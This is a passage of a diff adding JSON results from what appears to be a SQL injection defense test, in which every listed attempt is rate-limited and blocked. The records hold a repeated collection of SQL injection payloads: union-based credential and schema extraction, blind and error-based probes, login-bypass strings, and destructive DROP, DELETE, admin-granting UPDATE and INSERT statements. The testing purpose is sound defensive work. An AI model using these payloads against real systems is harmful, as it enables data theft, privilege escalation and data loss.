+      {
+        "payload": "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR SLEEP(5) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR SLEEP(3) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; WAITFOR DELAY '0:0:5' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR BENCHMARK(10000000,SHA1('test')) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND SLEEP(5) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND SLEEP(3) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR (SELECT SLEEP(5)) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 1=2 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 'a'='a' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 'a'='b' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND 1=2 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND (SELECT COUNT(*) FROM users)>0 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND SUBSTRING(username,1,1)='a' FROM users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; UPDATE users SET role='admin' WHERE username='attacker' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Privilege Escalation",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; UPDATE users SET role='admin' WHERE 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Privilege Escalation",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; UPDATE users SET is_admin=1 WHERE username='attacker' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Privilege Escalation",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DELETE FROM users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Data Deletion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DELETE FROM users WHERE 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Data Deletion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DELETE FROM sessions --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Data Deletion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DROP TABLE users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Table Drop",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DROP TABLE sessions --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Table Drop",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; DROP TABLE IF EXISTS users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Table Drop",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; INSERT INTO users (username,password,role) VALUES ('hacker','hacked','admin') --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Malicious Data Insertion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; INSERT INTO users VALUES (99,'hacker','hacked','admin') --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Malicious Data Insertion",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "''",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Error-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 'a'='a",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "admin' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR '1'='1' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR ''='",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' OR '1'='1",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "') OR ('1'='1",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 1=1#",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 1=1/*",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "admin'/*",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 1=1 -- -",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "\" OR 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "\" OR \"\"=\"",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "') OR ('x'='x",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Authentication Bypass",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT username,password FROM users --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION ALL SELECT NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION ALL SELECT NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION ALL SELECT NULL,NULL,NULL --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Union-Based Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT table_name FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT column_name FROM information_schema.columns --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT table_name,NULL FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT NULL,table_name FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT sql,NULL FROM sqlite_master --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Database Information Extraction",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR SLEEP(5) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR SLEEP(3) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "'; WAITFOR DELAY '0:0:5' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR BENCHMARK(10000000,SHA1('test')) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND SLEEP(5) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND SLEEP(3) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' OR (SELECT SLEEP(5)) --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Time-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 1=2 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 'a'='a' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND 'a'='b' --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND 1=1 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "1' AND 1=2 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
+        "payload": "' AND (SELECT COUNT(*) FROM users)>0 --",
+        "endpoint": "/",
+        "parameter": "input",
+        "attack_category": "Boolean-Based Blind Injection",
+        "defense_action": "Rate Limited",
+        "defense_technique": "Rate Limiting",
+        "explanation": "Rate limit exceeded \u2014 too many injection attempts on / within the monitoring window.",
+        "rules_triggered": [],
+        "safe_query_example": "",
+        "blocked": true
+      },
+      {
